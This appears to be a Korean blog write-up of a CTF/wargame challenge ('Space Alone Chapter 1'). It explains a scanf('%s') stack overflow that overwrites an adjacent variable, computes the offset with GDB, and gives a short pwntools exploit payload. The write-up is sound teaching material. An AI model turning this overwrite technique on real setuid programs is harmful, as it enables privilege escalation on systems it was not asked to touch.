---
title: "Space Alone Chapter 1 풀이"
date: 2026-11-14 19:00:00 +0900
categories: [CTF/Wargame]
tags: [space-alone, system-hacking, pwnable, bof]
---

[Space Alone 풀이 모음](/posts/space-alone/)

## 문제

<!-- story 요약, ls 결과 -->

```bash
ls -l
# -rwsr-xr-x  MV      (setuid, 다음 단계 계정 소유)
# -rw-r--r--  MV.c
```

## 소스 코드 분석

<!-- MV.c에서 핵심 부분 -->

```c
char admin[10] = "deny", id_input[20], pw_input[20];
scanf("%s", id_input);   // 길이 제한 없음 → 오버플로우

cmp3 = strncmp(id_input, "admin", 5);
cmp4 = strncmp(admin, "confirm", 7);
if(cmp3 == 0 && cmp4 == 0) { root(); }   // .TOP_SECRET 읽음
```

<!-- 취약점: scanf("%s")가 길이를 확인하지 않음. admin 변수는 "deny"로 고정이라
     입력으로 못 바꾸지만, id_input을 넘치게 하면 옆의 admin을 덮을 수 있음 -->

## 오프셋 구하기

<!-- GDB로 각 변수 위치 확인 -->

```
id_input = rbp-0x30
admin    = rbp-0x1a
거리: 0x30 - 0x1a = 0x16 = 22바이트
```

<!-- id_input 시작부터 22바이트 뒤가 admin 자리.
     앞 5글자는 "admin"(cmp3 통과)으로 써야 하므로 채울 더미는 22-5 = 17 -->

## 익스플로잇

```python
from pwn import *

p = process("./MV")
p.sendline(b"admin" + b"i"*17 + b"confirm")  # id_input 오버플로우 → admin 덮기
p.sendline(b"aaaa")                           # pw는 아무거나
p.sendline(b"2")                              # root 메뉴: Check File
```

## 막혔던 부분

<!-- 예: sendlineafter가 멈췄는데, printf에 \n이 없어서 출력이 버퍼에 갇혀 있던 문제.
     sendline으로 바꿔서 해결 -->

## 배운 점

- `scanf("%s")`는 길이 제한이 없어 BOF가 난다.
- 리턴 주소가 아니라 **인접한 스택 변수**를 덮는 것도 BOF의 한 형태다.
